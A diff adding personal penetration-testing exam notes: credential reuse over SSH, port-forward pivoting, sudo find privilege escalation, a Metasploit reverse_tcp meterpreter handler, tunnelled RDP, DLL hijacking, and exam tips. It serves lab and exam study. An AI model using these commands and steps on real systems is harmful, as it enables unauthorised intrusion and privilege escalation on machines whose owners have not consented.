@@ -78,5 +78,71 @@ New Webpage
     
     ADD TO CREDS
         Decode from ROT13
+check robots.txt 
+If you see a wall of text view the page source, you might see a link
+
+Try all creds on ssh 
+If it doesnt work it doesnt work 
+  IT HAPPENS OFTEN
+
+ssh -S /tmp/blah -O forward -L2222:<other ip>:22 ackack
+ssh -MS /tmp/newblah Aaron@127.0.0.1 -p2222
+        CASE SENSITIVITY
+When you get a shell 
+WHOAMI && hostname
+Check for Priv esc
+sudo -l
+/usr/bin/find is vulnerable to sudo
+get root access
+enumerate
+    Check /root
+    not every home dir in /home
+    netstat -antp
+    
+PING SWEEP
+You can go back and use directory traversal to check for backend access to the machine
+
+New Proxychain on box
+445 Always SMB
+3389 Always RDP
+9999 IDK LOL
+BANNER GRAB
+
+IF YOU SEE SECURE SERVER the machine is dummy easy lol
+    Use windows buff that you already have
+
+    msfconsole
+    use multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set lhost 0.0.0.0
+    set lport 54321
+IF NOT open then RDP in
+ssh -S /tmp/T2 -O forward -L9833:<IP>:3389 dummy
+xfreerdp /u:comrade /v:127.0.0.1:9833 +clipboard +dynamic-resolution +glyph-cache
+
+TRaverse to secure server
+If they give you a dll its dll hijacking
+    Find the name of a dll and replace it
+If the give you a executable its exe replacement
+    If you can successful rename it you can replace it
+    Use the file they give you and replace it where putty is or wherever it goes with .exe
+    Replace it and restart the box
+        MINIMUM 3 RESTARTS
+---------------------------------------------------------------
+Also know   Reverse Engineering
+            Exploit Developemnet
+            Find command gtfobins
+            Recon (Know how to scan, Ping sweep, etc hosts, ipa )
+            Web exploit (SQL Injection, Usernames and password)
+                look at dry run
+            Windows exploit
+                Know how to identify vuln services
+                They will give you dll replace or exe replace so pay attention
+            
         
+EXAM STUFF
+    QUESTION NAME IS GOING TO BE NAMED AFTER HOSTNAME
+    31 Questions
+    16/16 On part one and cruise on Part Two
+    Part one wink wink Reverse Engineering
     
